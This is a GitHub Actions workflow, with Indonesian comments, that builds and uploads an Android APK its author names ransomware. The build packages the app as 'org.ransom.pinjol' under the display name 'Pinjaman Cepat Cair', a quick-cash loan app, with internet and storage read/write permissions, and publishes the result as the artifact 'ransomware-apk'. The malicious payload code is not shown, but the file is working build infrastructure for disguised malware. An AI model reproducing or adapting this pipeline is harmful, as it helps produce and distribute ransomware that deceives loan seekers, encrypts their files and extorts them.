name: Build Ransomware APK (with NDK 25)

on:
  push:
    branches: [ "main" ]
  workflow_dispatch:

jobs:
  build:
    runs-on: ubuntu-22.04
    steps:
      - name: Checkout code
        uses: actions/checkout@v4

      - name: Set up Python
        uses: actions/setup-python@v5
        with:
          python-version: '3.9'

      - name: Set up Java 17
        uses: actions/setup-java@v4
        with:
          distribution: 'temurin'
          java-version: '17'

      - name: Install system dependencies
        run: |
          sudo apt-get update
          sudo apt-get install -y \
            python3-pip \
            git \
            zip \
            unzip \
            wget \
            autoconf \
            libtool \
            pkg-config \
            cmake \
            libffi-dev \
            libssl-dev \
            build-essential

      - name: Install Python dependencies (with modern Kivy)
        run: |
          pip install --upgrade pip
          pip install cython virtualenv
          # Gunakan python-for-android versi terbaru yang kompatibel dengan NDK 25
          pip install python-for-android==2024.1.21
          # Gunakan Kivy versi terbaru (3.0.0+) yang support NDK 25
          pip install pycryptodome requests kivy==3.0.0

      - name: Setup Android SDK
        run: |
          mkdir -p $HOME/android-sdk
          cd $HOME/android-sdk
          wget -q https://dl.google.com/android/repository/commandlinetools-linux-11076708_latest.zip
          unzip -q commandlinetools-linux-11076708_latest.zip
          mkdir -p cmdline-tools/latest
          mv cmdline-tools/* cmdline-tools/latest/ 2>/dev/null || true
          echo "ANDROID_HOME=$HOME/android-sdk" >> $GITHUB_ENV
          echo "$HOME/android-sdk/cmdline-tools/latest/bin" >> $GITHUB_PATH

      - name: Accept Android licenses
        run: |
          yes | $HOME/android-sdk/cmdline-tools/latest/bin/sdkmanager --licenses || true

      - name: Install SDK components (including NDK 25)
        run: |
          # Install platform tools dan build tools
          $HOME/android-sdk/cmdline-tools/latest/bin/sdkmanager "platform-tools" "platforms;android-31" "build-tools;31.0.0"
          # Install NDK versi 25.2.9519653 (versi spesifik dalam rilis 25)
          $HOME/android-sdk/cmdline-tools/latest/bin/sdkmanager "ndk;25.2.9519653"
          echo "ANDROID_NDK_HOME=$ANDROID_HOME/ndk/25.2.9519653" >> $GITHUB_ENV

      - name: 🚀 Build APK (with NDK 25)
        run: |
          p4a apk \
            --private . \
            --package=org.ransom.pinjol \
            --name="Pinjaman Cepat Cair" \
            --version=1.0 \
            --bootstrap=sdl2 \
            --requirements=python3,kivy==3.0.0,requests,pycryptodome \
            --permission INTERNET \
            --permission READ_EXTERNAL_STORAGE \
            --permission WRITE_EXTERNAL_STORAGE \
            --arch=arm64-v8a \
            --arch=armeabi-v7a \
            --sdk_dir=$ANDROID_HOME \
            --ndk_dir=$ANDROID_NDK_HOME \
            --android_api=31 \
            --minsdk=21 \
            --release \
            --verbose

      - name: 📦 Upload APK
        uses: actions/upload-artifact@v4
        with:
          name: ransomware-apk
          path: ./*.apk
          if-no-files-found: error